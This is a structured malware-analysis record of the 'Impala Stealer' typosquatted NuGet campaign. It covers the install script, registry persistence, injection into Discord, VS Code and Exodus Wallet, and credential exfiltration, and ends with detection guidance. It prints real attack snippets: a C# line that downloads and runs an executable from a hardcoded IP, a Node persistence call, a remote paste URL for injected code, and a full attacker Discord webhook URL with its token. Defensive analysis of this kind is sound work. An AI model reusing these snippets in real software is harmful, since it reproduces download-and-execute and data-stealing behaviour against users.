package_info.package_name: Impala Stealer (multiple NuGet packages, e.g., Coinbase.Core, Anarchy.Wrapper.Net, etc.)
package_info.package_versions: All versions listed in the campaign (2023-01-03 to 2023-03-12)
package_info.why_malicious: The packages use typosquatting to impersonate popular libraries and contain a malicious init.ps1 script that downloads and executes a custom stealer payload. The payload establishes persistence, auto-updates, and injects code into legitimate applications to steal cryptocurrency wallet credentials and exfiltrate them to an attacker-controlled Discord webhook.

malicious_snippets.code_behavior: During package installation, the script downloads a Windows executable from a remote server and executes it, initiating the malware infection chain.

malice_analysis.why_suspicious: Package install scripts should not download and execute arbitrary binaries from the internet.
malice_analysis.violated_expectations: Legitimate packages may use install scripts for setup, but not for fetching and running remote executables.
malice_analysis.similar_legitimate_use: Some enterprise packages may update dependencies, but never from untrusted sources.

malicious_snippets.code_behavior: At runtime, the payload checks for the existence of the %USERPROFILE%\.nuget directory and exits if not found, ensuring it only runs on systems infected via NuGet.

malice_analysis.why_suspicious: Malware often checks for specific conditions to avoid detection or analysis.
malice_analysis.violated_expectations: Legitimate software does not restrict execution to specific install paths in this way.

malicious_snippets.code_behavior: At runtime, the payload creates a registry key to ensure the Updater executable runs at user logon, establishing persistence.

malice_analysis.why_suspicious: Malware commonly uses registry Run keys for persistence.
malice_analysis.violated_expectations: Legitimate installers may register auto-start entries, but not for hidden updaters unrelated to user functionality.

malicious_snippets.code_snippet: WebClient webClient = new WebClient(); File.WriteAllBytes(Paths.File, webClient.DownloadData("http://62.182.84.61/4563636/Updater.exe")); Process.Start(Paths.File);
malicious_snippets.code_behavior: On execution, the Updater downloads the latest version of the payload from a remote server and executes it, enabling malware updates and resilience.

malice_analysis.why_suspicious: Self-updating malware is a common tactic for maintaining control and evading removal.
malice_analysis.violated_expectations: Legitimate updaters use signed, trusted sources and user consent.

malicious_snippets.code_snippet: var child = require('child_process').execFile; var executablePath = "C:\\ProgramData\\XboxGameBar\\RuntimeBroker.exe"; var parameters = ["-Log"]; child(executablePath, parameters, function(err, data) { console.log(err); console.log(data.toString()); });
malicious_snippets.code_behavior: At runtime, the payload injects code into Discord's modules to execute the main malware binary on Discord startup, ensuring persistence.

malice_analysis.why_suspicious: Injecting code into third-party applications for persistence is a hallmark of malware.
malice_analysis.violated_expectations: Legitimate plugins/extensions do not launch unrelated executables.

malicious_snippets.code_snippet: var child = require('child_process').execFile; var executablePath = "C:\\ProgramData\\XboxGameBar\\RuntimeBroker.exe"; var parameters = ["-Log"]; child(executablePath, parameters, function(err, data) { console.log(err); console.log(data.toString()); });
malicious_snippets.code_behavior: At runtime, the payload injects code into VS Code to execute the main malware binary on VS Code startup, ensuring persistence.

malice_analysis.why_suspicious: Persistence via code injection into developer tools is highly suspicious.
malice_analysis.violated_expectations: VS Code extensions should not launch unrelated executables.

malicious_snippets.code_snippet: injectedCode (downloaded from https://paste.bingner.com/paste/xden6/raw) inserted after await this._loadLightningCreds();
malicious_snippets.code_behavior: At runtime, after the user logs into Exodus Wallet, the injected code (downloaded from a remote paste site) executes in the wallet context, likely stealing decrypted credentials and exfiltrating them.

malice_analysis.why_suspicious: Dynamic code injection into a cryptocurrency wallet at the moment of credential decryption is highly malicious.
malice_analysis.violated_expectations: Wallet apps should never execute remote, unauthenticated code.

malicious_snippets.code_snippet: Content-Security-Policy modification to allow connect-src https://discord.com/; Addition of discord.com to wallet domains.
malicious_snippets.code_behavior: At runtime, the payload modifies Exodus Wallet's CSP and domain list to allow exfiltration of sensitive data to Discord webhooks.

malice_analysis.why_suspicious: Altering CSP to allow connections to attacker-controlled domains is a clear exfiltration enabler.
malice_analysis.violated_expectations: Wallets should restrict outbound connections to trusted domains.

malicious_snippets.code_snippet: POST to https://discord.com/api/webhooks/1076330498026115102/MLkgrUiivlgAoFWyvkSpLsBE3DMaDZd9cxPK3k9XQPyh6dw55jktV6qfDgxbs5AaY7Py with message: "user's Exodus has been pwned sorry g"
malicious_snippets.code_behavior: After successful credential theft, the payload sends a notification to a hardcoded Discord webhook, alerting the attacker.

malice_analysis.why_suspicious: Exfiltrating data to a public webhook is a classic sign of credential theft.
malice_analysis.violated_expectations: Legitimate software never sends sensitive data to third-party webhooks.

attack_chain.action: Malicious NuGet package is installed, triggering init.ps1 to download and execute the initial payload.
Payload checks for NuGet-specific directory to confirm infection vector.
Payload drops Updater executable and establishes persistence via registry Run key.
Updater downloads and executes the latest version of the payload from a remote server.
Payload injects code into Discord and VS Code to ensure malware runs on their startup.
Payload locates and extracts Exodus Wallet app.asar, injects remote code to steal credentials.
Payload modifies Exodus Wallet CSP and domain list to enable exfiltration to Discord.
Stolen credentials and notification are sent to attacker's Discord webhook.

behavioral_signatures: NuGet package install scripts downloading and executing remote binaries
Creation of persistence via registry Run keys pointing to non-standard updaters
Code injection into Discord or VS Code modules to launch unrelated executables
Modification of Electron app archives (app.asar) in cryptocurrency wallets
Outbound network connections to Discord webhooks from wallet processes
detection_knowledge.how_to_detect: Monitor NuGet package installations for scripts that download and execute remote binaries. Detect creation of persistence via registry Run keys referencing suspicious executables. Watch for unauthorized modifications to Electron app archives, especially in cryptocurrency wallets. Alert on outbound connections to Discord webhooks or known malicious IPs from wallet or developer tool processes. Use file integrity monitoring on Discord, VS Code, and Exodus Wallet directories for injected code.
